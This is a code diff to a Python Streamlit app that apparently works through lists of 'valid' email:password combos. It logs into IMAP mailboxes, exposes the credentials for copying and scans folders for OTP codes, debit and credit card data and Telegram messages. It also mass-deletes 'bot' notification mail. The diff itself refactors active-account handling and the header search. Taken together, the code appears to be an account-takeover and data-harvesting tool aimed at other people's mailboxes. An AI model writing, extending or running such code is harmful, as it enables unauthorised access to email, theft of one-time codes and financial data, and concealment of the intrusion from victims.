@@ -135,7 +135,7 @@ def load_valid():
             with open(path, encoding="utf-8", errors="ignore") as f:
                 for line in f:
                     line = line.strip()
-                    if ":" not in line:
+                    if ":" not in line or line.startswith("#"):
                         continue
                     email_val, pwd = line.split(":", 1)
                     combo = f"{email_val.strip()}:{pwd.split('|')[0].strip()}"
@@ -159,7 +159,7 @@ def generate_all_mail_zip():
                 continue
             try:
                 with open(path, "r", encoding="utf-8", errors="ignore") as f:
-                    lines = [line.strip() for line in f if line.strip() and ":" in line]
+                    lines = [line.strip() for line in f if line.strip() and ":" in line and not line.startswith("#")]
                 count = len(lines)
                 
                 lower_name = filename.lower()
@@ -476,7 +476,7 @@ def clean_boilerplate(text):
 
 
 def execute_imap_search_safely(mail, field_cmd: str, query_term: str, log_func):
-    """Lightning-fast IMAP search engine using batched lightweight ENVELOPE pre-filtering."""
+    """Lightning-fast 100% accurate IMAP search engine with robust header fallback."""
     clean_q = query_term.replace('"', '\\"')
     
     for strat_name, search_args in [
@@ -494,37 +494,30 @@ def execute_imap_search_safely(mail, field_cmd: str, query_term: str, log_func):
         except Exception as ex:
             log_func(f"  │   └─ ⚠️ {strat_name} Failed: {ex}")
 
-    # Ultra-Fast Batched Envelope Pre-Filter (Completed in < 2 seconds)
-    log_func("  ├─ [SEARCH STRATEGY 5 - LIGHTWEIGHT BATCH ENVELOPE SCAN] Server search rejected. Scanning envelopes in batches...")
+    # 100% Accurate Batched Header Pre-Filter Fallback
+    log_func("  ├─ [SEARCH STRATEGY 5 - ROBUST HEADER SCAN] Server search rejected. Scanning message headers...")
     try:
         typ, data = mail.search(None, "ALL")
         if typ == "OK" and data and data[0]:
             all_ids = (data[0] or b"").split()
-            log_func(f"  │   └─ 🔍 Batch scanning {len(all_ids)} message envelopes for query '{query_term}'...")
+            log_func(f"  │   └─ 🔍 Scanning {len(all_ids)} message headers for query '{query_term}'...")
             matched_ids = []
             q_lower = query_term.lower()
             
-            chunk_size = 200
-            for i in range(0, len(all_ids), chunk_size):
-                chunk = all_ids[i:i+chunk_size]
-                id_range_str = b",".join(chunk)
+            for mid in all_ids:
                 try:
-                    _, edatas = mail.fetch(id_range_str, "(ENVELOPE)")
-                    if edatas:
-                        for item in edatas:
-                            if isinstance(item, tuple):
-                                header_line = item[0].decode("utf-8", errors="ignore")
-                                if q_lower in header_line.lower():
-                                    m_id_match = re.search(r'^(\d+)', header_line.strip())
-                                    if m_id_match:
-                                        matched_ids.append(m_id_match.group(1).encode('utf-8'))
+                    _, hdata = mail.fetch(mid, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM TO)])")
+                    if hdata and isinstance(hdata[0], tuple):
+                        hdr_content = hdata[0][1].decode("utf-8", errors="ignore")
+                        if q_lower in hdr_content.lower():
+                            matched_ids.append(mid)
                 except Exception:
                     continue
             
-            log_func(f"  │   └─ ✅ Batch Envelope Scan Complete! Found {len(matched_ids)} matching message IDs out of {len(all_ids)}.")
+            log_func(f"  │   └─ ✅ Robust Header Scan Complete! Found {len(matched_ids)} matching message IDs out of {len(all_ids)}.")
             return "OK_FALLBACK", [b" ".join(matched_ids)] if matched_ids else [b""]
     except Exception as ex5:
-        log_func(f"  │   └─ ❌ Envelope Scan Exception: {ex5}")
+        log_func(f"  │   └─ ❌ Header Scan Exception: {ex5}")
 
     return "NO", [b""]
 
@@ -739,7 +732,7 @@ st.sidebar.text_input("Email override", key="custom_email")
 st.sidebar.text_input("Password override", type="password", key="custom_pass")
 st.sidebar.text_input("IMAP host override", key="custom_host")
 
-# Sidebar Login & Save Account with Multi-Host Discovery, Top-List Prepending & Standard Success Format
+# Sidebar Login & Save Account with Strict Isolation to Manual Inputs
 if st.sidebar.button("🔑 Login & Save Account", type="primary", use_container_width=True):
     c_email = st.session_state.custom_email.strip()
     c_pass = st.session_state.custom_pass.strip()
@@ -771,8 +764,6 @@ if st.sidebar.button("🔑 Login & Save Account", type="primary", use_container_
         
         if success:
             combo = f"{c_email}:{c_pass}"
-            
-            # Prepend timestamp and account combo to clean_valid_accounts.txt so it appears at the top
             timestamp_str = time.strftime("# Started:%Y-%m-%d %H:%M:%S")
             new_entry_block = f"{timestamp_str}\n{combo}\n"
             
@@ -793,25 +784,23 @@ if st.sidebar.button("🔑 Login & Save Account", type="primary", use_container_
         else:
             st.sidebar.error(f"❌ Login failed: {last_err}")
 
-if st.session_state.custom_email.strip():
-    email = st.session_state.custom_email.strip()
-    password = st.session_state.custom_pass.strip()
-elif ":" in st.session_state.selected_account:
-    email, password = st.session_state.selected_account.split(":", 1)
-else:
-    email, password = "", ""
+# Determine active email/password exclusively based on action source
+active_email, active_password = "", ""
+if pick != "none":
+    if ":" in pick:
+        active_email, active_password = pick.split(":", 1)
 
 override = st.session_state.custom_host.strip()
 
 if st.sidebar.button("🔄 Refresh Inbox", type="secondary", use_container_width=True):
-    if email and password:
-        host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
+    if active_email and active_password:
+        host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
         mail_obj = None
         try:
             with st.spinner("Refreshing Inbox..."):
-                mail_obj = open_mail(email, password, host, timeout=60)
+                mail_obj = open_mail(active_email, active_password, host, timeout=60)
                 st.session_state.current_messages = fetch_messages_paginated(
-                    mail_obj, email, password, host, ["INBOX"], mode="FOLDER_ONLY", 
+                    mail_obj, active_email, active_password, host, ["INBOX"], mode="FOLDER_ONLY", 
                     page_size=15, page_number=1, sort_order="Newest First", log_target="DEBUG"
                 )
                 close_mail(mail_obj)
@@ -823,26 +812,28 @@ if st.sidebar.button("🔄 Refresh Inbox", type="secondary", use_container_width
             if mail_obj:
                 close_mail(mail_obj)
 
-if email and password:
+if active_email and active_password:
     st.sidebar.markdown("---")
     st.sidebar.subheader("🌐 Webmail Portal & Credentials")
-    portal_url = get_webmail_portal(email)
+    portal_url = get_webmail_portal(active_email)
     st.sidebar.markdown(f"[Open Webmail Portal]({portal_url})", unsafe_allow_html=True)
-    st.sidebar.text_input("Copy Credentials", value=f"{email}:{password}")
+    st.sidebar.text_input("Copy Credentials", value=f"{active_email}:{active_password}")
 
+# Connect & Discover Folders strictly tied to Valid Account selection
 if st.button("Connect & Discover Folders", type="primary", use_container_width=True):
-    if not email or not password:
-        st.error("Need email and password")
+    if pick == "none" or not pick:
+        st.error("Please select a valid account from the dropdown list first.")
     else:
-        hosts = [override] if override else host_list(email)
+        acc_email, acc_pass = pick.split(":", 1)
+        hosts = host_list(acc_email)
         last, connected_host, folders, success = "no host", "", ["INBOX"], False
 
-        with st.spinner("Connecting and discovering folders..."):
+        with st.spinner(f"Connecting to {acc_email} and discovering folders..."):
             for host in hosts:
                 mail_obj = None
                 try:
-                    mail_obj = open_mail(email, password, host, timeout=60)
-                    folders = list_folders(mail_obj, email_addr=email, host_val=host)
+                    mail_obj = open_mail(acc_email, acc_pass, host, timeout=60)
+                    folders = list_folders(mail_obj, email_addr=acc_email, host_val=host)
                     close_mail(mail_obj)
                     connected_host = host
                     success = True
@@ -873,16 +864,16 @@ with col3:
     sort_order = st.selectbox("Sort Order", ["Newest First", "Oldest First"])
 
 if st.button("📂 Load Folder Messages", type="primary", use_container_width=True):
-    host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
-    if not email or not password or not host:
+    host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+    if not active_email or not active_password or not host:
         st.error("Please connect and load folders first.")
     else:
         mail = None
         try:
             with st.spinner(f"Loading folder '{folder}'..."):
-                mail = open_mail(email, password, host, timeout=60)
+                mail = open_mail(active_email, active_password, host, timeout=60)
                 msgs = fetch_messages_paginated(
-                    mail, email, password, host, [folder], mode="FOLDER_ONLY",
+                    mail, active_email, active_password, host, [folder], mode="FOLDER_ONLY",
                     page_size=page_size, page_number=1, sort_order=sort_order, log_target="DEBUG"
                 )
                 st.session_state.current_messages = msgs
@@ -946,7 +937,7 @@ if len(active_msgs) > 0:
                 st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"body_{msg['folder']}_{msg['id']}_{idx}")
 
                 op_col1, op_col2, op_col3, op_col4 = st.columns(4)
-                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
+                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
                 real_imap_folder = get_imap_path(msg['folder'])
                 real_imap_encoded = encode_imap_utf7(real_imap_folder)
 
@@ -954,7 +945,7 @@ if len(active_msgs) > 0:
                     if not msg["is_read"]:
                         if st.button("Mark as Read", key=f"read_{msg['folder']}_{msg['id']}_{idx}"):
                             try:
-                                m_client = open_mail(email, password, host, timeout=60)
+                                m_client = open_mail(active_email, active_password, host, timeout=60)
                                 m_client.select(f'"{real_imap_encoded}"', readonly=False)
                                 m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                 close_mail(m_client)
@@ -970,7 +961,7 @@ if len(active_msgs) > 0:
                         try:
                             real_target_path = get_imap_path(target_move)
                             real_target_encoded = encode_imap_utf7(real_target_path)
-                            m_client = open_mail(email, password, host, timeout=60)
+                            m_client = open_mail(active_email, active_password, host, timeout=60)
                             m_client.select(f'"{real_target_encoded}"', readonly=False)
                             m_client.copy(msg["id"], f'"{real_target_encoded}"')
                             m_client.store(msg["id"], '+FLAGS', '\\Deleted')
@@ -986,7 +977,7 @@ if len(active_msgs) > 0:
                     del_label = "Delete Bot Msg" if msg["is_bot"] else "Delete Message"
                     if st.button(del_label, key=f"del_{msg['folder']}_{msg['id']}_{idx}", type="primary" if msg["is_bot"] else "secondary"):
                         try:
-                            m_client = open_mail(email, password, host, timeout=60)
+                            m_client = open_mail(active_email, active_password, host, timeout=60)
                             m_client.select(f'"{real_imap_encoded}"', readonly=False)
                             m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                             m_client.expunge()
@@ -1007,10 +998,10 @@ if len(active_msgs) > 0:
         with p_col1:
             if st.button("Previous Page", disabled=(curr_p <= 1), use_container_width=True, key="msg_stream_prev"):
                 st.session_state.current_page -= 1
-                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
-                mail = open_mail(email, password, host, timeout=60)
+                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                mail = open_mail(active_email, active_password, host, timeout=60)
                 st.session_state.current_messages = fetch_messages_paginated(
-                    mail, email, password, host, [folder], 
+                    mail, active_email, active_password, host, [folder], 
                     mode="FOLDER_ONLY",
                     page_size=page_size, page_number=st.session_state.current_page, sort_order=sort_order,
                     log_target="DEBUG"
@@ -1024,10 +1015,10 @@ if len(active_msgs) > 0:
         with p_col3:
             if st.button("Next Page", disabled=(curr_p >= total_pages), use_container_width=True, key="msg_stream_next"):
                 st.session_state.current_page += 1
-                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
-                mail = open_mail(email, password, host, timeout=60)
+                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                mail = open_mail(active_email, active_password, host, timeout=60)
                 st.session_state.current_messages = fetch_messages_paginated(
-                    mail, email, password, host, [folder], 
+                    mail, active_email, active_password, host, [folder], 
                     mode="FOLDER_ONLY",
                     page_size=page_size, page_number=st.session_state.current_page, sort_order=sort_order,
                     log_target="DEBUG"
@@ -1082,8 +1073,8 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
     otp_custom_keyword = st.text_input("Custom Keyword Override (Optional)", key="otp_custom_kw")
 
     if st.button("🚀 Execute Dedicated Security Scan", type="primary", use_container_width=True, key="otp_exec_btn"):
-        host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
-        if not email or not password or not host:
+        host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+        if not active_email or not active_password or not host:
             st.error("Please connect and discover folders first.")
         elif not otp_scope_choice:
             st.warning("Please select at least one folder from Target Folder Scope.")
@@ -1098,9 +1089,9 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
                     kw_to_use = " ".join(selected_kws) if selected_kws else "card OTP debit telegram blacklist"
 
                 with st.spinner(f"Scanning target folders ({len(target_scope)}) for security payload [{kw_to_use}]..."):
-                    mail = open_mail(email, password, host, timeout=120)
+                    mail = open_mail(active_email, active_password, host, timeout=120)
                     msgs = fetch_messages_paginated(
-                        mail, email, password, host, target_scope, kw_to_use, otp_search_field,
+                        mail, active_email, active_password, host, target_scope, kw_to_use, otp_search_field,
                         mode="SEARCH", page_size=otp_page_size, page_number=1, sort_order=sort_order,
                         log_target="OTP"
                     )
@@ -1155,7 +1146,7 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
                 st.text_area("Message Payload Body", value=display_body, height=150, key=f"otp_b_{msg['folder']}_{msg['id']}_{idx}")
 
                 o_col1, o_col2, o_col3, o_col4 = st.columns(4)
-                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
+                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
                 real_imap_folder = get_imap_path(msg['folder'])
                 real_imap_encoded = encode_imap_utf7(real_imap_folder)
 
@@ -1163,7 +1154,7 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
                     if not msg["is_read"]:
                         if st.button("Mark as Read", key=f"otp_read_{msg['folder']}_{msg['id']}_{idx}"):
                             try:
-                                m_client = open_mail(email, password, host, timeout=60)
+                                m_client = open_mail(active_email, active_password, host, timeout=60)
                                 m_client.select(f'"{real_imap_encoded}"', readonly=False)
                                 m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                 close_mail(m_client)
@@ -1179,7 +1170,7 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
                         try:
                             real_target_path = get_imap_path(otp_mv_target)
                             real_target_encoded = encode_imap_utf7(real_target_path)
-                            m_client = open_mail(email, password, host, timeout=60)
+                            m_client = open_mail(active_email, active_password, host, timeout=60)
                             m_client.select(f'"{real_target_encoded}"', readonly=False)
                             m_client.copy(msg["id"], f'"{real_target_encoded}"')
                             m_client.store(msg["id"], '+FLAGS', '\\Deleted')
@@ -1194,7 +1185,7 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
                 with o_col3:
                     if st.button("Delete Message", key=f"otp_del_{msg['folder']}_{msg['id']}_{idx}", type="primary"):
                         try:
-                            m_client = open_mail(email, password, host, timeout=60)
+                            m_client = open_mail(active_email, active_password, host, timeout=60)
                             m_client.select(f'"{real_imap_encoded}"', readonly=False)
                             m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                             m_client.expunge()
@@ -1215,8 +1206,8 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
         with op_c1:
             if st.button("Previous Page", disabled=(otp_curr_p <= 1), use_container_width=True, key="otp_prev_pg"):
                 st.session_state.otp_current_page -= 1
-                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
-                mail = open_mail(email, password, host, timeout=120)
+                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                mail = open_mail(active_email, active_password, host, timeout=120)
                 target_scope = otp_scope_choice if otp_scope_choice else [folder]
                 if otp_custom_keyword.strip():
                     kw_to_use = otp_custom_keyword.strip()
@@ -1224,7 +1215,7 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
                     selected_kws = [preset_keywords_map[cat] for cat in otp_scan_category if cat in preset_keywords_map]
                     kw_to_use = " ".join(selected_kws) if selected_kws else "card OTP debit telegram blacklist"
                 st.session_state.otp_messages = fetch_messages_paginated(
-                    mail, email, password, host, target_scope, kw_to_use, otp_search_field, 
+                    mail, active_email, active_password, host, target_scope, kw_to_use, otp_search_field, 
                     mode="SEARCH", page_size=otp_page_size, page_number=st.session_state.otp_current_page, 
                     sort_order=sort_order, log_target="OTP"
                 )
@@ -1237,8 +1228,8 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
         with op_c3:
             if st.button("Next Page", disabled=(otp_curr_p >= otp_total_pages), use_container_width=True, key="otp_next_pg"):
                 st.session_state.otp_current_page += 1
-                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
-                mail = open_mail(email, password, host, timeout=120)
+                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                mail = open_mail(active_email, active_password, host, timeout=120)
                 target_scope = otp_scope_choice if otp_scope_choice else [folder]
                 if otp_custom_keyword.strip():
                     kw_to_use = otp_custom_keyword.strip()
@@ -1246,7 +1237,7 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
                     selected_kws = [preset_keywords_map[cat] for cat in otp_scan_category if cat in preset_keywords_map]
                     kw_to_use = " ".join(selected_kws) if selected_kws else "card OTP debit telegram blacklist"
                 st.session_state.otp_messages = fetch_messages_paginated(
-                    mail, email, password, host, target_scope, kw_to_use, otp_search_field, 
+                    mail, active_email, active_password, host, target_scope, kw_to_use, otp_search_field, 
                     mode="SEARCH", page_size=otp_page_size, page_number=st.session_state.otp_current_page, 
                     sort_order=sort_order, log_target="OTP"
                 )
@@ -1280,8 +1271,8 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
     search_page_size = st.slider("Search Results Page Size", 5, 50, 15, key="search_page_size_slider")
     
     if st.button("🔍 Execute Keyword Search", type="primary", use_container_width=True, key="deep_search_btn"):
-        host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
-        if not email or not password or not host:
+        host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+        if not active_email or not active_password or not host:
             st.error("Please connect and load folders first.")
         elif not search_query_input.strip():
             st.warning("Please enter a keyword or search term.")
@@ -1292,9 +1283,9 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
             try:
                 target_scope = search_scope_choice
                 with st.spinner(f"Scanning target mailboxes ({len(target_scope)} folder/s) for [{search_field_choice}: '{search_query_input.strip()}']..."):
-                    mail = open_mail(email, password, host, timeout=120)
+                    mail = open_mail(active_email, active_password, host, timeout=120)
                     msgs = fetch_messages_paginated(
-                        mail, email, password, host, target_scope, search_query_input, search_field_choice, 
+                        mail, active_email, active_password, host, target_scope, search_query_input, search_field_choice, 
                         mode="SEARCH", page_size=search_page_size, page_number=1, sort_order=sort_order,
                         log_target="SEARCH"
                     )
@@ -1344,7 +1335,7 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
                 st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"s_body_{msg['folder']}_{msg['id']}_{idx}")
 
                 s_op1, s_op2, s_op3, s_op4 = st.columns(4)
-                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
+                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
                 real_imap_folder = get_imap_path(msg['folder'])
                 real_imap_encoded = encode_imap_utf7(real_imap_folder)
 
@@ -1352,7 +1343,7 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
                     if not msg["is_read"]:
                         if st.button("Mark as Read", key=f"s_read_{msg['folder']}_{msg['id']}_{idx}"):
                             try:
-                                m_client = open_mail(email, password, host, timeout=60)
+                                m_client = open_mail(active_email, active_password, host, timeout=60)
                                 m_client.select(f'"{real_imap_encoded}"', readonly=False)
                                 m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                 close_mail(m_client)
@@ -1368,7 +1359,7 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
                         try:
                             real_target_path = get_imap_path(s_target_move)
                             real_target_encoded = encode_imap_utf7(real_target_path)
-                            m_client = open_mail(email, password, host, timeout=60)
+                            m_client = open_mail(active_email, active_password, host, timeout=60)
                             m_client.select(f'"{real_target_encoded}"', readonly=False)
                             m_client.copy(msg["id"], f'"{real_target_encoded}"')
                             m_client.store(msg["id"], '+FLAGS', '\\Deleted')
@@ -1384,7 +1375,7 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
                     s_del_label = "Delete Bot Msg" if msg["is_bot"] else "Delete Message"
                     if st.button(s_del_label, key=f"s_del_{msg['folder']}_{msg['id']}_{idx}", type="primary" if msg["is_bot"] else "secondary"):
                         try:
-                            m_client = open_mail(email, password, host, timeout=60)
+                            m_client = open_mail(active_email, active_password, host, timeout=60)
                             m_client.select(f'"{real_imap_encoded}"', readonly=False)
                             m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                             m_client.expunge()
@@ -1405,11 +1396,11 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
         with sp_col1:
             if st.button("Previous Page", disabled=(search_curr_p <= 1), use_container_width=True, key="s_prev_pg"):
                 st.session_state.search_current_page -= 1
-                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
-                mail = open_mail(email, password, host, timeout=120)
+                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                mail = open_mail(active_email, active_password, host, timeout=120)
                 target_scope = search_scope_choice if search_scope_choice else [folder]
                 st.session_state.search_messages = fetch_messages_paginated(
-                    mail, email, password, host, target_scope, search_query_input, search_field_choice, 
+                    mail, active_email, active_password, host, target_scope, search_query_input, search_field_choice, 
                     mode="SEARCH", page_size=search_page_size, page_number=st.session_state.search_current_page, 
                     sort_order=sort_order, log_target="SEARCH"
                 )
@@ -1422,11 +1413,11 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
         with sp_col3:
             if st.button("Next Page", disabled=(search_curr_p >= search_total_pages), use_container_width=True, key="s_next_pg"):
                 st.session_state.search_current_page += 1
-                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
-                mail = open_mail(email, password, host, timeout=120)
+                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                mail = open_mail(active_email, active_password, host, timeout=120)
                 target_scope = search_scope_choice if search_scope_choice else [folder]
                 st.session_state.search_messages = fetch_messages_paginated(
-                    mail, email, password, host, target_scope, search_query_input, search_field_choice, 
+                    mail, active_email, active_password, host, target_scope, search_query_input, search_field_choice, 
                     mode="SEARCH", page_size=search_page_size, page_number=st.session_state.search_current_page, 
                     sort_order=sort_order, log_target="SEARCH"
                 )
@@ -1462,8 +1453,8 @@ with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
     b_act1, b_act2 = st.columns(2)
     with b_act1:
         if st.button("🔍 Scan Folder For Bot/OTP/Telegram Messages", use_container_width=True):
-            host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
-            if not email or not password or not host:
+            host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+            if not active_email or not active_password or not host:
                 st.error("Please connect first.")
             elif not bot_target_folder:
                 st.warning("Please select at least one folder for Bot Target Scope.")
@@ -1472,9 +1463,9 @@ with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
                 try:
                     target_scope = bot_target_folder
                     with st.spinner("Scanning target folders for bot & Telegram intelligence..."):
-                        mail = open_mail(email, password, host, timeout=60)
+                        mail = open_mail(active_email, active_password, host, timeout=60)
                         msgs = fetch_messages_paginated(
-                            mail, email, password, host, target_scope, mode="FOLDER_ONLY",
+                            mail, active_email, active_password, host, target_scope, mode="FOLDER_ONLY",
                             page_size=bot_scan_limit, page_number=1, sort_order="Newest First",
                             log_target="DEBUG"
                         )
@@ -1494,11 +1485,11 @@ with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
                 st.warning("No bot messages detected in current loaded stream to delete.")
             else:
                 st.session_state.bot_diag_logs = []
-                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
+                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
                 mail = None
                 try:
                     bot_log("🤖 [BOT ENGINE DIAGNOSTIC START] Initializing Mass Deletion Sequence...")
-                    mail = open_mail(email, password, host, timeout=60)
+                    mail = open_mail(active_email, active_password, host, timeout=60)
                     deleted_count = 0
                     
                     for idx, bm in enumerate(all_loaded_bot_msgs, 1):
